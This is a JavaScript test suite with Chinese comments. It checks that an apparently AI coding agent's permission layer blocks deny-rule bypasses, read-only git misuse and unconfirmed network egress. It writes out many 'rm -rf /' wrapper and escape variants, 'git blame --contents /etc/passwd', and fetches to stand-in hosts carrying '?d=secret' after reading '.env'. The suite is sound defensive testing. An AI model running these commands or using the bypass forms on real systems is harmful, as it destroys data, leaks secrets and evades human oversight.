// 授权边界加固回归（v0.6.30，报告四 S1/H2 + 报告三 C-06/H-12）。
//
// 三条都属"控制存在、边界被高估"：
//   C1 [严重] deny/denyStrict 可被绝对路径与包装前缀绕过（`/bin/rm`、`env rm`、`sudo -u x rm`、
//            `xargs rm`、`FOO=1 rm`、`sh -c "rm"`、`\rm`、`r''m` 全部直达）——而 auto 档下 deny
//            是唯一防线、denyStrict 更是文档承诺的硬拦截；
//   C2 [严重] `git` 列为只读工具，但 `blame --contents` 可读**仓库外**任意文件，
//            `branch <名>` / `tag <名>` 可创建 ref 却免询问；
//   C3 [高]   默认 ask 档下 `read` + `fetch` 都自动放行，且 `config.net` 未配置时出网闸门不安装
//            → 零确认外传通道。
//
// 为什么单独成一套（而不是塞进 smoke.js）：本批任务禁止改 test/smoke.js（其它并行轨道在改它），
// 而这三条需要**表驱动 + 真实 git 仓库**的细粒度断言。本套件可单独跑，也是
// test/mutate/batch63-permission-hardening.mjs 的判定入口。
//
// 运行：node test/permission-hardening.js [--only=C1|C2|C3]

import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { fileURLToPath, pathToFileURL } from 'node:url';

const root = path.join(path.dirname(fileURLToPath(import.meta.url)), '..');
const srcDir = path.join(root, 'src');
const load = (/** @type {string} */ rel) => import(pathToFileURL(path.join(srcDir, rel)).href);

let passed = 0;
/** @type {string[]} */
const failures = [];

function ok(/** @type {string} */ name) {
  passed += 1;
  console.log(`  ✓ ${name}`);
}

/**
 * 跑一条断言；失败**不中断**后面的用例（要一次看全所有红，变异批次才能按关键词判逃逸）。
 * @param {string} name
 * @param {() => any} fn
 */
async function check(/** @type {string} */ name, /** @type {() => any} */ fn) {
  try {
    await fn();
    ok(name);
  } catch (/** @type {any} */ e) {
    failures.push(`${name}：${String(e?.message || e)}`);
    console.log(`  ✗ ${name}：${String(e?.message || e)}`);
  }
}

/** 造一个可用的 git 仓库（无 git 时返回 null）。 */
function makeRepo() {
  if (spawnSync('git', ['--version'], { encoding: 'utf8' }).status !== 0) return null;
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'mingdao-permhard-git-'));
  const g = (/** @type {string[]} */ args) => spawnSync('git', args, { cwd: dir, encoding: 'utf8' });
  g(['init', '-q']);
  fs.writeFileSync(path.join(dir, 'a.txt'), 'hello\n');
  g(['add', 'a.txt']);
  g(['-c', 'user.email=t@t', '-c', 'user.name=t', 'commit', '-qm', 'first']);
  return dir;
}

// ─────────────────────────────────────────────────────────────────────────────
// C1：deny 的命令归一化（≥14 条，含任务书列出的全部写法）
// ─────────────────────────────────────────────────────────────────────────────
async function testC1DenyCanonicalization() {
  const PERM = await load('permissions.js');
  /** auto 档 + denyStrict：deny 是唯一防线，任何绕过都等于规则不存在。 */
  const cfg = { mode: 'auto', deny: ['bash:rm *'], denyStrict: true };
  const dec = (/** @type {string} */ c) => PERM.evaluatePermission(cfg, 'bash', { command: c }).decision;

  // ① 表驱动：全部必须 deny
  /** @type {[string, string][]} */
  const mustDeny = [
    ['rm -rf /', '基线：裸命令必须被 deny 命中'],
    ['/bin/rm -rf /', '绝对路径必须归一为 basename'],
    ['/usr/local/bin/rm -rf /', '多级绝对路径同样必须归一为 basename'],
    ['env rm -rf /', '包装前缀必须剥离（env）'],
    ['env A=1 rm -rf /', '包装器内的环境变量赋值必须剥离'],
    ['sudo rm -rf /', '包装前缀必须剥离（sudo）'],
    ['sudo -u root rm -rf /', '包装前缀必须剥离（sudo 带选项）'],
    ['xargs rm -rf /', '包装前缀必须剥离（xargs）'],
    ['command rm -rf /', '包装前缀必须剥离（command）'],
    ['nice -n 5 rm -rf /', '包装前缀必须剥离（nice 带选项）'],
    ['timeout 5 rm -rf /', '包装前缀必须剥离（timeout 带时长操作数）'],
    ['nohup rm -rf /', '包装前缀必须剥离（nohup）'],
    ['builtin rm -rf /', '包装前缀必须剥离（builtin）'],
    ['exec rm -rf /', '包装前缀必须剥离（exec）'],
    ['FOO=1 rm -rf /', '前缀环境变量赋值必须剥离'],
    ['sh -c "rm -rf /"', 'sh -c 里的真命令必须递归判定'],
    ["bash -lc 'rm -rf /'", 'bash -lc 里的真命令必须递归判定'],
    ['rm|cat', '拆分后任一段命中即拒（管道）'],
    ['a && rm', '拆分后任一段命中即拒（&&）'],
    ['$(rm -rf /)', '命令替换必须拆段判定'],
    ['\\rm -rf /', '引号拼接与反斜杠转义必须归一（反斜杠转义）'],
    ["r''m -rf /", '引号拼接与反斜杠转义必须归一（空引号拼接）'],
  ];
  let i = 0;
  for (const [cmd, why] of mustDeny) {
    i += 1;
    await check(`C1-${String(i).padStart(2, '0')} denv 拒绝：${cmd}`, () => {
      assert.equal(dec(cmd), 'deny', `${why}；实际 ${dec(cmd)}（命令：${cmd}）`);
    });
  }

  // ② 归一化后仍要能取到 basename 与包装器后的真命令
  await check('C1-23 canonicalizeCommand：/bin/rm → basename 形态可判定', () => {
    const cands = PERM.canonicalizeCommand('/bin/rm -rf /').map((c) => c.text);
    assert.ok(cands.includes('/bin/rm -rf /'), `必须保留全名形态：${JSON.stringify(cands)}`);
    const base = PERM.basenameOfCommand('/bin/rm');
    assert.equal(base, 'rm', `basename 必须是 rm：${base}`);
    assert.equal(PERM.basenameOfCommand('C:\\Windows\\System32\\RM.EXE'), 'RM', 'Windows 路径与 .exe 也要归一');
  });

  // ③ 不得误伤：只是"看起来像 rm"的其他命令 / 引号里的字面量 / 普通只读命令
  /** @type {[string, string][]} */
  const mustAllow = [
    ['rmdir /tmp/x', 'rmdir 与 rm 不是同一可执行文件'],
    ['format c:', 'format 与 rm 无关'],
    ['echo "rm -rf /"', '引号内的字面量不是被执行的命令'],
    ['ls -la', '无关只读命令不得误伤'],
    ['git status', '无关只读命令不得误伤（git）'],
    ['/bin/rmdir /tmp/x', '绝对路径的 rmdir 同样不得误伤'],
  ];
  for (const [cmd, why] of mustAllow) {
    await check(`C1 不误伤：${cmd}`, () => {
      assert.equal(dec(cmd), 'allow', `${why}；实际 ${dec(cmd)}（命令：${cmd}）`);
    });
  }

  // ④ 非 denyStrict 的普通 deny 同样要走归一化（deny 是"防手滑"档的唯一硬判据）
  await check('C1 普通 deny（非 denyStrict）也要归一化后匹配', () => {
    const soft = { mode: 'auto', deny: ['bash:rm *'] };
    assert.equal(PERM.evaluatePermission(soft, 'bash', { command: '/bin/rm -rf /x' }).decision, 'deny', '普通 deny 也必须拦住 /bin/rm');
  });

  // ⑤ allow 的前缀语义不变（归一化只用于 deny；不得把 `git *` 白名单扩成任意命令）
  await check('C1 allow 规则语义不受归一化影响', () => {
    const p = { mode: 'ask', allow: ['bash:git *'], deny: [] };
    assert.equal(PERM.evaluatePermission(p, 'bash', { command: 'git status' }).decision, 'allow', 'allow 前缀仍应命中简单命令');
    assert.equal(PERM.evaluatePermission(p, 'bash', { command: 'git status && rm -rf /x' }).decision, 'ask', '链式命令不得借 allow 前缀提权');
  });
}

// ─────────────────────────────────────────────────────────────────────────────
// C2：git 子命令与参数白名单化（≥10 条）
// ─────────────────────────────────────────────────────────────────────────────
async function testC2GitAllowlist() {
  const { runGit } = await load('tools/git.js');
  const repo = makeRepo();
  const cwd = repo || process.cwd();
  const run = (/** @type {string} */ command) => runGit({ command }, { workingDir: cwd });
  /** 被拒的调用必须带可见原因（任务书 C2-4）。 */
  const assertRejected = async (/** @type {string} */ command, /** @type {RegExp} */ re, /** @type {string} */ why) => {
    const r = await run(command);
    assert.equal(r.ok, false, `${why}；实际被执行了：${command}`);
    const msg = String(r.error || '');
    assert.ok(msg.trim().length > 0, `${why}；拒绝时必须给出可见原因（命令：${command}）`);
    assert.ok(re.test(msg), `${why}；拒绝原因应可操作，实际：${msg.slice(0, 160)}`);
    return r;
  };

  await check('C2-01 blame --contents 必须拒绝（它读仓库外的任意文件）', async () => {
    const r = await assertRejected('blame --contents /etc/passwd -- a.txt', /contents|仓库外/, 'blame --contents 必须拒绝');
    assert.ok(String(r.error).includes('仓库外'), '拒绝原因必须说清"仓库外文件"，否则用户不知道危害');
  });

  await check('C2-02 blame --contents 的前缀缩写同样拒绝', () =>
    assertRejected('blame --cont /etc/passwd -- a.txt', /白名单|被禁止|contents/, 'blame 的未登记缩写不得绕过'));

  await check('C2-03 branch <名> 必须被拒（创建 ref 是写操作）', async () => {
    await assertRejected('branch pwned-by-model', /写操作|被禁止/, 'branch <名> 必须被拒（写操作）');
  });

  await check('C2-04 tag <名> 必须被拒（创建 ref 是写操作）', async () => {
    await assertRejected('tag v-evil', /写操作|被禁止/, 'tag <名> 必须被拒（写操作）');
  });

  await check('C2-05 branch -D 必须被拒（删除 ref）', () =>
    assertRejected('branch -D feature', /被禁止/, 'branch -D 必须被拒'));

  await check('C2-06 tag -d 必须被拒（删除 tag）', () =>
    assertRejected('tag -d v1', /被禁止/, 'tag -d 必须被拒'));

  await check('C2-07 stash / remote add 等写类子命令不在只读白名单', async () => {
    await assertRejected('stash list', /不是只读/, 'stash 不是只读子命令');
    await assertRejected('remote add origin https://example/x.git', /不是只读/, 'remote add 不是只读子命令');
    await assertRejected('push --force', /不是只读/, 'push 不是只读子命令');
  });

  await check('C2-08 未登记参数按白名单拒绝（不再靠黑名单兜底）', () =>
    assertRejected('status --foo', /白名单/, '未知参数必须按白名单拒绝'));

  await check('C2-09 越界读/写文件的参数仍被点名拒绝', async () => {
    await assertRejected('diff --no-index a b', /被禁止的参数/, '--no-index 越界读必须拒绝');
    await assertRejected('diff --no-inde a b', /被禁止的参数/, '--no-index 的前缀缩写同样必须拒绝');
    await assertRejected('log --output=/tmp/x.txt', /被禁止的参数/, '--output 写文件必须拒绝');
    await assertRejected('log --ext-diff', /被禁止的参数/, '--ext-diff 会执行外部程序，必须拒绝');
  });

  await check('C2-10 正常 log / show / diff / status 仍然放行', async () => {
    for (const c of ['status', 'status --short', 'log --oneline -3', 'log -n 5', 'show --stat', 'diff --stat', 'rev-parse --verify HEAD']) {
      const r = await run(c);
      if (repo) assert.equal(r.ok, true, `只读查询应放行：${c}（实际 ${r.error || ''}）`);
      else assert.ok(!/白名单|被禁止/.test(String(r.error || '')), `只读查询不得被白名单误拦：${c}`);
    }
  });

  await check('C2-11 仍未禁止只读的 ref 列表（branch -a / tag -l）', async () => {
    if (!repo) return; // 无 git：无法验证真实仓库，跳过（拒绝类断言不依赖仓库）
    for (const c of ['branch -a', 'tag -l', 'branch --list', 'tag --list']) {
      const r = await run(c);
      assert.equal(r.ok, true, `列出现有 ref 是只读查询，应放行：${c}（实际 ${r.error || ''}）`);
    }
  });

  await check('C2-12 被拒的写形态不得产生副作用（ref 未被创建）', async () => {
    if (!repo) return;
    const g = (/** @type {string[]} */ args) => spawnSync('git', args, { cwd: repo, encoding: 'utf8' });
    assert.equal(g(['branch', '--list', 'pwned-by-model']).stdout.trim(), '', 'branch 写形态被拒后不得留下 ref');
    assert.equal(g(['tag', '--list', 'v-evil']).stdout.trim(), '', 'tag 写形态被拒后不得留下 tag');
  });

  await check('C2-13 带查询参数的 ref 只读形态仍可用（--contains/--sort 的值不是新 ref 名）', async () => {
    if (!repo) return; // 无 git 时 git 自身会报错，无法区分"白名单误拦"
    for (const c of ['branch --contains HEAD', 'tag --sort=-creatordate']) {
      const r = await run(c);
      assert.ok(!/白名单|被禁止/.test(String(r.error || '')), `只读 ref 查询不得被误拦：${c}（实际 ${r.error || ''}）`);
    }
  });
}

// ─────────────────────────────────────────────────────────────────────────────
// C3：fetch 归 NET 类 + net 未配置默认拒绝 + read→fetch 确认文案（≥8 条）
// ─────────────────────────────────────────────────────────────────────────────
async function testC3EgressDefaults() {
  const TOOLS = await load('tools/index.js');
  const PERM = await load('permissions.js');
  const NG = await load('net-guard.js');
  NG.uninstallEgressGate(); // 从"未配置"状态开始

  await check('C3-01 fetch 不得再属于只读工具集合（归 NET_TOOLS）', () => {
    assert.equal(TOOLS.READONLY_TOOLS.has('fetch'), false, 'fetch 不得再属于只读工具集合');
    assert.equal(TOOLS.NET_TOOLS.has('fetch'), true, 'fetch 必须归入 NET_TOOLS（出网类，需逐次确认）');
  });

  await check('C3-02 默认 ask 档下 fetch 需要确认（不再自动放行）', () => {
    assert.equal(PERM.evaluatePermission('ask', 'fetch', { url: 'https://evil.example/x' }).decision, 'ask', 'ask 档 fetch 必须问');
  });

  await check('C3-03 只读档同样不再自动放行 fetch', async () => {
    assert.equal(PERM.evaluatePermission('readonly', 'fetch', { url: 'https://evil.example/x' }).decision, 'ask', 'readonly 档 fetch 不得自动放行');
    const io = { ask: async () => 'n', print: () => {} };
    const p = PERM.createPermission('readonly', io);
    assert.equal(await p.check('fetch', { url: 'https://evil.example/x' }), false, 'readonly 档 fetch 被拒时必须返回 false');
  });

  await check('C3-04 未配置 net 时 fetch 默认拒绝出网（且原因可见）', async () => {
    const r = await TOOLS.dispatch('fetch', { url: 'https://exfil.example.invalid/?d=secret' }, { cwd: process.cwd(), cfg: {} });
    assert.equal(r.ok, false, '未配置 net 时 fetch 必须默认拒绝出网');
    const msg = String(r.error || '');
    assert.ok(/未配置/.test(msg), '未配置 net 时 fetch 必须默认拒绝出网：拒绝原因须说清"未配置 net 白名单"，而不是笼统失败');
    assert.ok(/config\.net\.allow/.test(msg), '默认拒绝必须给出可操作提示：把域名加入 config.net.allow（默认拒绝必须给出可操作提示）');
    assert.ok(/默认禁止出网/.test(msg), '提示必须明确"默认禁止出网"，默认拒绝必须给出可操作提示');
  });

  await check('C3-05 默认拒绝判定：公网拒、回环/私网交给 SSRF（不抢先改写原因）', () => {
    const pub = NG.unconfiguredEgressVerdict('https://evil.example/x');
    assert.ok(pub && pub.blocked === true, '未配置 net 时公网地址必须默认拒绝');
    assert.equal(NG.unconfiguredEgressVerdict('http://127.0.0.1:9/x'), null, '回环不算出网，应交给 SSRF 判定');
    assert.equal(NG.unconfiguredEgressVerdict('http://169.254.169.254/latest/meta-data/'), null, '元数据地址交给 SSRF 判定，保留专门措辞');
    assert.equal(NG.unconfiguredEgressVerdict('file:///etc/passwd'), null, '非 http(s) 不在出网判定内');
  });

  await check('C3-06 配置了 config.net 后交给既有策略（不再一律拒绝）', () => {
    assert.equal(NG.installEgressGate({ allow: ['evil.example'], mode: 'warn' }), true, '配置后闸门应安装');
    try {
      assert.equal(NG.unconfiguredEgressVerdict('https://evil.example/x'), null, '已配置时不走"未配置默认拒绝"分支');
    } finally {
      NG.uninstallEgressGate();
    }
  });

  await check('C3-07 fetch 本机地址仍给出 SSRF 的专门措辞（默认拒绝不抢答）', async () => {
    const r = await TOOLS.dispatch('fetch', { url: 'http://127.0.0.1:9/' }, { cwd: process.cwd(), cfg: {} });
    assert.equal(r.ok, false, '本机地址必须拒绝');
    assert.ok(/内网/.test(String(r.error || '')), `拒绝理由应说明内网（SSRF），实际：${String(r.error || '').slice(0, 80)}`);
  });

  await check('C3-08 read 之后 fetch 的确认文案必须标出外传风险', async () => {
    /** @type {string[]} */
    const prompts = [];
    const io = { ask: async (/** @type {string} */ q) => (prompts.push(String(q)), 'n'), print: () => {} };
    const p = PERM.createPermission('ask', io);
    assert.equal(await p.check('read', { path: '/tmp/.env' }), true, 'read 属只读工具，应自动放行');
    assert.equal(await p.check('fetch', { url: 'https://evil.example/?d=secret' }), false, '用户答 n：fetch 必须被拒');
    assert.equal(prompts.length, 1, `fetch 应恰好问一次（实际 ${prompts.length} 次）`);
    const q = prompts[0];
    assert.ok(q.includes('可能携带刚读取的本地内容'), 'read 之后 fetch 的确认文案必须标出外传风险');
    assert.ok(q.includes('/tmp/.env'), '确认文案应点名刚读取的文件（用户才能判断）');
    assert.ok(q.includes('https://evil.example/?d=secret'), '确认文案必须显示目标 URL（否则无从判断）');
  });

  await check('C3-09 未先 read 时确认文案不得出现外传提示（负面对照）', async () => {
    /** @type {string[]} */
    const prompts = [];
    const io = { ask: async (/** @type {string} */ q) => (prompts.push(String(q)), 'n'), print: () => {} };
    const p = PERM.createPermission('ask', io);
    await p.check('fetch', { url: 'https://evil.example/' });
    assert.equal(prompts.length, 1, 'fetch 应恰好问一次');
    assert.equal(prompts[0].includes('可能携带刚读取的本地内容'), false, '没有 read 时不得无条件追加外传提示');
  });

  await check('C3-10 read 后 fetch 在 readonly 档的放行询问同样带外传提示', async () => {
    /** @type {string[]} */
    const prompts = [];
    // readonly 档的 read 自动放行；fetch 走「只读模式将拦截」的放行询问
    const io = { ask: async (/** @type {string} */ q) => (prompts.push(String(q)), 'n'), print: () => {} };
    const p = PERM.createPermission('readonly', io);
    assert.equal(await p.check('read', { path: '/tmp/secret.txt' }), true, 'readonly 档 read 应自动放行');
    await p.check('fetch', { url: 'https://evil.example/x' });
    assert.ok(prompts.length >= 1 && prompts[0].includes('可能携带刚读取的本地内容'), '只读档的出网放行询问也必须带外传提示');
  });
}

// --only=<C1|C2|C3>：单组排查（变异批次不传）
const only = (process.argv.slice(2).find((a) => a.startsWith('--only=')) || '').split('=')[1] || '';
const GROUPS = /** @type {[string, () => Promise<void>][]} */ ([
  ['C1', testC1DenyCanonicalization],
  ['C2', testC2GitAllowlist],
  ['C3', testC3EgressDefaults],
]);
for (const [name, fn] of GROUPS) {
  if (only && !name.includes(only)) continue;
  console.log(`\n[${name}]`);
  await fn();
}
if (failures.length) {
  console.error(`\n✗ permission-hardening 失败 ${failures.length} 条：`);
  for (const f of failures) console.error(`  ✗ ${f}`);
  process.exitCode = 1;
} else {
  console.log(`\npermission-hardening：${passed} 组/条断言全部通过`);
}
